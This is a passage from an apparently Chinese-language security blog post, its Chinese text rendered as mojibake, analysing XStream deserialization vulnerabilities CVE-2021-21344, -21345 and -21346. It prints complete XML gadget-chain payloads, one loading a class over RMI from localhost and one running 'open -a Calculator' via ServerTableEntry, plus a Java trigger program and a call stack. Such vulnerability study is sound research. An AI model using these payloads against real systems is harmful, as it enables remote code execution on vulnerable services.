class="tag">&lt;<span class="name">fetchSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">fetchSize</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">isolation</span>&gt;</span>2<span class="tag">&lt;/<span class="name">isolation</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">maxFieldSize</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxFieldSize</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">maxRows</span>&gt;</span>0<span class="tag">&lt;/<span class="name">maxRows</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">queryTimeout</span>&gt;</span>0<span class="tag">&lt;/<span class="name">queryTimeout</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">readOnly</span>&gt;</span>true<span class="tag">&lt;/<span class="name">readOnly</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">rowSetType</span>&gt;</span>1004<span class="tag">&lt;/<span class="name">rowSetType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">showDeleted</span>&gt;</span>false<span class="tag">&lt;/<span class="name">showDeleted</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">dataSource</span>&gt;</span>rmi://127.0.0.1:1099/w6zukm<span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">params</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">iMatchColumns</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">iMatchColumns</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">strMatchColumns</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">strMatchColumns</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">jaxbObject</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">satellites</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">invocationProperties</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">packet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">indexMap</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">comparator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CVE_2021_21344</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        xStream.fromXML(<span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;/Users/ocean/Cybersecurity/Java_project/Xstream_stu/src/main/resources/cve_2021_21344_payload.xml&quot;</span>));</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¼šå¼¹å‡ºè®¡ç®—å™¨</p><p>è¿™é‡Œçœ‹ä¸€ä¸‹ä»–çš„ååºåˆ—æµç¨‹ï¼Œè¿™é‡Œå¯ä»¥çœ‹åˆ°å¼€å¤´ç”¨çš„æ˜¯PriorityQueueç±»äº†è§£è¿‡ccé“¾çš„éƒ½çŸ¥é“å®ƒé‡å†™äº†readObjectæ–¹æ³•æ‰€ä»¥åœ¨ååºåˆ—åŒ–æ—¶æ˜¯ä¼šæ¯è°ƒç”¨çš„æˆ‘ä»¬å°±å°†æ–­ç‚¹ä¸‹åœ¨é‚£</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735394671430-a67b3eb7-5af8-4d5c-8879-964311debe56.png"></p><p>è·Ÿè¿›headpifyæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735394688606-f74df932-37bd-4b7b-80ae-325a9e6e159e.png"></p><p>è®¡å…¥siftDownæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735394722570-b3b76ee9-414a-4d0d-920a-193ec006213b.png"></p><p>ç»§ç»­è¿›å…¥siftDownUsingComparatoræ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735394769183-7b001f01-05a1-46fc-9022-aecd52e23ff0.png"></p><p>è¿™é‡Œä¼šè°ƒç”¨compareæ–¹æ³•ï¼Œæ­¤æ—¶è¿™é‡Œçš„comparatorå±æ€§çš„å€¼æ˜¯<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735394872196-b04b902c-9f02-4e52-a45e-23270e13c5af.png"></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735394888615-29560649-b86d-4056-9641-8ac96310fae8.png"></p><p>è·Ÿè¿›çœ‹çœ‹ä»–çš„compareæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735394920646-783fb188-f87a-4898-a452-47c8ae0f7ae3.png">è·Ÿè¿›compareIndicesæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735394989361-1a2beec3-c51e-4d24-8de4-c579d04d6450.png"></p><p>è·Ÿè¿›getæ–¹æ³•</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735395056918-497f16a1-d220-4ff2-968e-457ccf8608f8.png">åé¢å°±æ˜¯ç»§ç»­è·Ÿï¼Œå„ç§å¤æ‚çš„è°ƒç”¨åæ­£æ˜¯ï¼Œçœ‹ä¸€ä¸‹è°ƒç”¨æ ˆå§ï¼Œè¯¦ç»†çš„æˆ‘ä¹Ÿä¸å¤ªäº†è§£ï¼Œåæ­£æ˜¯æœ€åä¼šèµ°åˆ°jdbcRowSetImplé‡Œè°ƒç”¨lookupæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">connect:<span class="number">622</span>, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">getDatabaseMetaData:<span class="number">4004</span>, JdbcRowSetImpl (com.sun.rowset)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">get:<span class="number">343</span>, Accessor$GetterSetterReflection (com.sun.xml.internal.bind.v2.runtime.reflect)</span><br><span class="line">serializeURIs:<span class="number">402</span>, ClassBeanInfoImpl (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">childAsXsiType:<span class="number">662</span>, XMLSerializer (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">write:<span class="number">256</span>, MarshallerImpl (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">marshal:<span class="number">89</span>, BridgeImpl (com.sun.xml.internal.bind.v2.runtime)</span><br><span class="line">marshal:<span class="number">130</span>, Bridge (com.sun.xml.internal.bind.api)</span><br><span class="line">marshal:<span class="number">161</span>, BridgeWrapper (com.sun.xml.internal.ws.db.glassfish)</span><br><span class="line">writeTo:<span class="number">109</span>, JAXBAttachment (com.sun.xml.internal.ws.message)</span><br><span class="line">asInputStream:<span class="number">99</span>, JAXBAttachment (com.sun.xml.internal.ws.message)</span><br><span class="line">getInputStream:<span class="number">125</span>, JAXBAttachment (com.sun.xml.internal.ws.message)</span><br><span class="line">getMessage:<span class="number">366</span>, XMLMessage$XMLMultiPart (com.sun.xml.internal.ws.encoding.xml)</span><br><span class="line">getAttachments:<span class="number">465</span>, XMLMessage$XMLMultiPart (com.sun.xml.internal.ws.encoding.xml)</span><br><span class="line">getAttachments:<span class="number">103</span>, MessageWrapper (com.sun.xml.internal.ws.api.message)</span><br><span class="line">get:<span class="number">111</span>, ResponseContext (com.sun.xml.internal.ws.client)</span><br><span class="line">compareIndices:<span class="number">2492</span>, DataTransferer$IndexedComparator (sun.awt.datatransfer)</span><br><span class="line">compare:<span class="number">2970</span>, DataTransferer$IndexOrderComparator (sun.awt.datatransfer)</span><br><span class="line">siftDownUsingComparator:<span class="number">721</span>, PriorityQueue (java.util)</span><br><span class="line">siftDown:<span class="number">687</span>, PriorityQueue (java.util)</span><br><span class="line">heapify:<span class="number">736</span>, PriorityQueue (java.util)</span><br><span class="line">readObject:<span class="number">795</span>, PriorityQueue (java.util)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">callReadObject:<span class="number">113</span>, SerializationMethodInvoker (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">doUnmarshal:<span class="number">412</span>, SerializableConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">unmarshal:<span class="number">230</span>, AbstractReflectionConverter (com.thoughtworks.xstream.converters.reflection)</span><br><span class="line">convert:<span class="number">72</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convert:<span class="number">65</span>, AbstractReferenceUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:<span class="number">66</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">convertAnother:<span class="number">50</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">start:<span class="number">134</span>, TreeUnmarshaller (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:<span class="number">32</span>, AbstractTreeMarshallingStrategy (com.thoughtworks.xstream.core)</span><br><span class="line">unmarshal:<span class="number">1035</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">unmarshal:<span class="number">1019</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">fromXML:<span class="number">904</span>, XStream (com.thoughtworks.xstream)</span><br><span class="line">main:<span class="number">12</span>, CVE_2021_21344 (com.ocean)</span><br></pre></td></tr></table></figure><h2 id="CVE-2021-21345"><a href="#CVE-2021-21345" class="headerlink" title="CVE-2021-21345"></a>CVE-2021-21345</h2><h3 id="æµ‹è¯•ç¯å¢ƒ-3"><a href="#æµ‹è¯•ç¯å¢ƒ-3" class="headerlink" title="æµ‹è¯•ç¯å¢ƒ"></a>æµ‹è¯•ç¯å¢ƒ</h3><p>jdk8u65</p><p>xstream 1.4.15</p><p>ç›´æ¥çœ‹payload</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">java.util.PriorityQueue</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">size</span>&gt;</span>2<span class="tag">&lt;/<span class="name">size</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">comparator</span> <span class="attr">class</span>=<span class="string">&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">indexMap</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">packet</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">message</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">dataSource</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">bridge</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">bi</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">jaxbType</span>&gt;</span>com.sun.corba.se.impl.activation.ServerTableEntry<span class="tag">&lt;/<span class="name">jaxbType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">uriProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">attributeProperties</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">inheritedAttWildcard</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">getter</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">class</span>&gt;</span>com.sun.corba.se.impl.activation.ServerTableEntry<span class="tag">&lt;/<span class="name">class</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">name</span>&gt;</span>verify<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">parameter-types</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">getter</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">inheritedAttWildcard</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">bi</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">tagName</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">context</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">marshallerPool</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">outer-class</span> <span class="attr">reference</span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">marshallerPool</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">nameList</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">boolean</span>&gt;</span>true<span class="tag">&lt;/<span class="name">boolean</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">nsUriCannotBeDefaulted</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>1<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">namespaceURIs</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">localNames</span>&gt;</span></span><br><span class="line">                          <span class="tag">&lt;<span class="name">string</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;/<span class="name">localNames</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">nameList</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">context</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">bridge</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">jaxbObject</span> <span class="attr">class</span>=<span class="string">&#x27;com.sun.corba.se.impl.activation.ServerTableEntry&#x27;</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">activationCmd</span>&gt;</span>open -a Calculator<span class="tag">&lt;/<span class="name">activationCmd</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">jaxbObject</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">satellites</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">invocationProperties</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">packet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">indexMap</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">comparator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><p>è¿™é‡Œå’Œ21344çš„å·®åˆ«ä¸æ˜¯å¤ªå¤§ï¼Œå”¯ä¸€çš„ä¸åŒç‚¹åœ¨äºæ‰§è¡Œä»£ç çš„ä½ç½®ä¸å†ä½¿ç”¨JdbcRowSetImplå»è¿œç¨‹åŠ è½½æ¶æ„ç±»æ¥åˆ°æœ¬åœ°æ‰§è¡Œæ¶æ„ä»£ç ï¼Œè€Œæ˜¯ä½¿ç”¨<code>com.sun.corba.se.impl.activation.ServerTableEntry</code>ç±»ç›´æ¥åœ¨æœ¬åœ°æ‰§è¡Œæ¶æ„ä»£ç ã€‚ç›´æ¥çœ‹æœ€å…³é”®ä¸åŒçš„ç‚¹æ˜¯ä»€ä¹ˆåŸå› </p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735395542917-0917a60c-aa7b-4cc7-b371-c3e1e8130de0.png"></p><p>å¯ä»¥çœ‹åˆ°è¯¥ç±»çš„verifyæ–¹æ³•ä¸­è°ƒç”¨äº†ä¸€ä¸ªæ‰§è¡Œå‘½ä»¤çš„æ–¹æ³•å¹¶ä¸”è¿™é‡Œçš„å±æ€§å€¼æˆ‘ä»¬å¯æ§æ‰€ä»¥å¯ä»¥rce</p><h2 id="CVE-2021-21346"><a href="#CVE-2021-21346" class="headerlink" title="CVE-2021-21346"></a>CVE-2021-21346</h2><h3 id="æµ‹è¯•ç¯å¢ƒ-4"><a href="#æµ‹è¯•ç¯å¢ƒ-4" class="headerlink" title="æµ‹è¯•ç¯å¢ƒ"></a>æµ‹è¯•ç¯å¢ƒ</h3><p>jdk8u65</p><p>xstream 1.4.15</p><p>ç›´æ¥çœ‹payload</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.thoughtworks.xstream.XStream;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileNotFoundException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">CVE_2021</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> FileNotFoundException &#123;</span><br><span class="line">        <span class="type">XStream</span> <span class="variable">xStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">XStream</span>();</span><br><span class="line">        <span class="type">String</span> <span class="variable">xml</span> <span class="operator">=</span> <span class="string">&quot;&lt;sorted-set&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;    &lt;javax.naming.ldap.Rdn_-RdnEntry&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;type&gt;ysomap&lt;/type&gt;\n&quot;</span> +</span><br><span class="line">                <span class="string">&quot;        &lt;value 